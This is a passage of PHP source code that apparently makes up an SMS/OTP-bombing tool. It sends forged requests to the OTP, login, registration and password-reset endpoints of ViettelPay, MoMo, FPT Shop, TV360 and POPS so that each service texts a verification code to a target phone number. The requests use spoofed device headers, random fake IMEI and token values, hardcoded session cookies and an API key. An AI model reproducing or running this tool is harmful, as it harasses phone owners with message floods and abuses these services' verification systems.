		$GET = json(CURL("POST", "https://api8.viettelpay.vn/auth/v1/authn/login", json_encode($data), $head, false));
	}
	if($GET["status"]["message"] == "Cần xác thực bổ sung OTP" or $GET["status"]["message"] == "Vui lòng nhập mã OTP được gửi về SĐT ".$phone." để xác minh chính chủ"){
		return true; 
	} else {
		return false; 
	}
}
//otp call
function MOMO($phone){
	$imei = generateImei();
	$sec = get_SECUREID();
	$token = get_TOKEN();
	$rkey = generateRandom(20);
	$aaid = generateImei();
	$microtime = get_microtime();
	$head = array(
		"agent_id: undefined",
		"sessionkey:",
		"user_phone: undefined",
		"authorization: Bearer undefined",
		"msgtype: CHECK_USER_BE_MSG",
		"Host: api.momo.vn",
		"User-Agent: okhttp/4.0.12",
		"app_version: 40122",
		"app_code: 4.0.12",
		"device_os: ANDROID"
	);
	$data = array (
		'user' => $phone,
		'msgType' => 'CHECK_USER_BE_MSG',
		'cmdId' => (string) $microtime. '000000',
		'lang' => 'vi',
		'time' => $microtime,
		'channel' => 'APP',
		'appVer' => '40122',
		'appCode' => '4.0.12',
		'deviceOS' => 'ANDROID',
		'buildNumber' => 0,
		'appId' => 'vn.momo.platform',
		'result' => true,
		'errorCode' => 0,
		'errorDesc' => '',
		'momoMsg' => 
		array (
			'_class' => 'mservice.backend.entity.msg.RegDeviceMsg',
			'number' => $phone,
			'imei' => $imei,
			'cname' => 'Vietnam',
			'ccode' => '084',
			'device' => "Oppo realme X Lite",
			'firmware' => '23',
			'hardware' => "RMX1851CN",
			'manufacture' => "Oppo",
			'csp' => '',
			'icc' => '',
			'mcc' => '452',
			'device_os' => 'Android',
			'secure_id' => $sec,
		),
		'extra' => array (
			'checkSum' => '',
		),
	);
	$GET = CURL("POST", "https://api.momo.vn/backend/auth-app/public/CHECK_USER_BE_MSG", json_encode($data), $head, false);
	$head = array(
		"agent_id: undefined",
		"sessionkey:",
		"user_phone: undefined",
		"authorization: Bearer undefined",
		"msgtype: SEND_OTP_MSG",
		"Host: api.momo.vn",
		"User-Agent: okhttp/4.0.12",
		"app_version: 40122",
		"app_code: 4.0.12",
		"device_os: ANDROID"
	);
	$data = array (
		'user' => $phone,
		'msgType' => 'SEND_OTP_MSG',
		'cmdId' => (string) $microtime. '000000',
		'lang' => 'vi',
		'time' => $microtime,
		'channel' => 'APP',
		'appVer' => '40122',
		'appCode' => '4.0.12',
		'deviceOS' => 'ANDROID',
		'buildNumber' => 0,
		'appId' => 'vn.momo.platform',
		'result' => true,
		'errorCode' => 0,
		'errorDesc' => '',
		'momoMsg' => 
		array (
			'_class' => 'mservice.backend.entity.msg.RegDeviceMsg',
			'number' => $phone,
			'imei' => $imei,
			'cname' => 'Vietnam',
			'ccode' => '084',
			'device' => "Galaxy A21s",
			'firmware' => '23',
			'hardware' => "SM-A217F/DS",
			'manufacture' => "Samsung",
			'csp' => '',
			'icc' => '',
			'mcc' => '452',
			'device_os' => 'Android',
			'secure_id' => $sec,
		),
		'extra' => 
		array (
			'action' => 'SEND',
			'rkey' => $rkey,
			'AAID' => $aaid,
			'IDFA' => '',
			'TOKEN' => $token,
			'SIMULATOR' => '',
			'SECUREID' => $sec,
			'MODELID' => "Oppo RMX1851",
			'isVoice' => false,
			'REQUIRE_HASH_STRING_OTP' => true,
			'checkSum' => '',
		),
	);
	$GET = json(CURL("POST", "https://api.momo.vn/backend/otp-app/public/", json_encode($data), $head, false));
	if($GET["errorDesc"] == "Thành công"){
		return true; 
	} else {
		return false; 
	}
}
function FPTSHOP($phone){
	$head = array(
		"Host: fptshop.com.vn",
		"Accept: */*",
		"X-Requested-With: XMLHttpRequest",
		"User-Agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.85 Mobile Safari/537.36",
		"Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
	);
	$data = 'phone='.$phone;
	$GET = json(CURL("POST", "https://fptshop.com.vn/api-data/loyalty/Login/Verification", $data, $head, false));
	if($GET["datas"]["expiredSeconds"] == "299"){
		return true; 
	} else {
		return false; 
	}
}
function TV360($phone){
	$url = "http://m.tv360.vn/public/v1/auth/get-otp-login";
	$ch = curl_init();
	$data = '{"msisdn":"'.$phone.'"}';
	$head = array(
		"Host: m.tv360.vn",
		"Connection: keep-alive",
		"Accept: application/json, text/plain, */*",
		"User-Agent: Mozilla/5.0 (Linux; Android 11; SM-A217F Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36",
		"Content-Type: application/json",
		"Origin: http://m.tv360.vn",
		"Referer: http://m.tv360.vn/login?r=http%3A%2F%2Fm.tv360.vn%2F",
		"Cookie: img-ext=avif; session-id=s%3A80c6fbad-d7e1-4dac-92a6-6cb5897bcf98.vnOf3K%2B010rNLX1ydurEP6VbvWURhbu4yAmsZ7EoxqQ; device-id=s%3Awap_649b61fe-eafa-4467-a902-894759722239.Z3iCDzH0lKHxKMRhPojvaWT%2BOFwOmZpVB11XnqALrJM; screen-size=s%3A385x854.YsJCQUjKOJSkUOYLfVhMNjngvj0EBsElrxhbkBkUaj0; access-token=; refresh-token=; msisdn=; profile=; user-id=; auto-login=1; G_ENABLED_IDPS=google"
	);
	$access = json(CURL("POST", $url, $data, $head, false));
	if($access["errorCode"] == 200){
		return true; 
	} else {
		return false; 
	}
}
function POPS($phone){
	$head = array(
		"Host: pops.vn",
		"content-type: application/json",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"accept: */*",
		"origin: https://pops.vn",
		"referer: https://pops.vn/auth/signin-signup/signup",
		"cookie: ssid=:1678719841"
	);
	$access = CURL("GET", "https://pops.vn/auth/signin-signup/signup", null, $head, false);
	$token = explode('"', explode('"DEFAULT_TOKEN":"', $access)[1])[0];
	$head = array(
		"Host: products.popsww.com",
		"profileid: 64078d77bb84c700517c9ce4",
		"authorization: ".$token,
		"x-env: production",
		"content-type: application/json",
		"lang: vi",
		"sub-api-version: 1.1",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"api-key: 5d2300c2c69d24a09cf5b09b",
		"platform: wap",
		"accept: */*",
		"origin: https://pops.vn",
		"referer: https://pops.vn/auth/signin-signup/signup",
		"cookie: ssid=:1678719841"
	);
	$data = '{"fullName":"","account":"'.$phone.'","password":"123456789","confirmPassword":"123456789"}';
	$access = json(CURL("POST", "https://products.popsww.com/api/v5/auths/register", $data, $head, false));
	if($access["meta"]){
		return true; 
	} else if($access["error"]["statusCode"] == 400){
		$data = '{"account":"'.$phone.'"}';
		$access = json(CURL("POST", "https://products.popsww.com/api/v5/auths/forgotPassword", $data, $head, false));
		if($access["data"]["status"] == "OK"){
			return true; 
		} else {
			return true; 
		}
	}
}

function CURL($method, $url, $data, $head, $headers){
	$ch = curl_init();
		curl_setopt_array($ch, array(
			CURLOPT_URL => $url,
			CURLOPT_HTTPHEADER => $head,
			CURLOPT_POSTFIELDS => $data,
			CURLOPT_CUSTOMREQUEST => $method,
			CURLOPT_ENCODING => '',
			CURLOPT_HEADER => $headers,
			CURLOPT_POST => TRUE,
			CURLOPT_RETURNTRANSFER => 1,
			CURLOPT_FOLLOWLOCATION => TRUE
		));
	$access = curl_exec($ch); 
	return $access;
}
function json($data){
	return json_decode($data,true);
}
function generateRandom($length) {
	$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
	$charactersLength = strlen($characters);
	$randomString = '';
	for ($i = 0; $i < $length; $i++) {
		$randomString .= $characters[rand(0, $charactersLength - 1)];
	}
	return $randomString;
}
function generateRandomString($length) {
	$characters = '0123456789abcdef';
	$charactersLength = strlen($characters);
	$randomString = '';
	for ($i = 0; $i < $length; $i++) {
		$randomString .= $characters[rand(0, $charactersLength - 1)];
	}
	return $randomString;
}
function generateImei() {
	return generateRandomString(8) . '-' . generateRandomString(4) . '-' . generateRandomString(4) . '-' . generateRandomString(4) . '-' . generateRandomString(12);
}
function get_string($data) {
	return str_replace(array('<',"'",'>','?','/',"\\",'--','eval(','<php','-'),array('','','','','','','','','',''),htmlspecialchars(addslashes(strip_tags($data))));
}
function get_microtime() {
	return round(microtime(true) * 1000);
}
function get_TOKEN() {
	return generateRandom(22).':'.generateRandom(9).'-'.generateRandom(20).'-'.generateRandom(12).'-'.generateRandom(7).'-'.generateRandom(7).'-'.generateRandom(53).'-'.generateRandom(9).'_'.generateRandom(11).'-'.generateRandom(4);
}
function get_SECUREID($length = 17) {
	$characters = '0123456789abcdef';
	$charactersLength = strlen($characters);
	$randomString = '';
	for ($i = 0; $i < $length; $i++) {
		$randomString .= $characters[rand(0, $charactersLength - 1)];
	}
	return $randomString;
}
function generateRandomstr($length) {
	$characters = '0123456789';
	$charactersLength = strlen($characters);
	$randomString = '';
	for ($i = 0; $i < $length; $i++) {
		$randomString .= $characters[rand(0, $charactersLength - 1)];
	}
	return $randomString;
}
function ECHOJSON($data){
	return json_encode($data, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
}
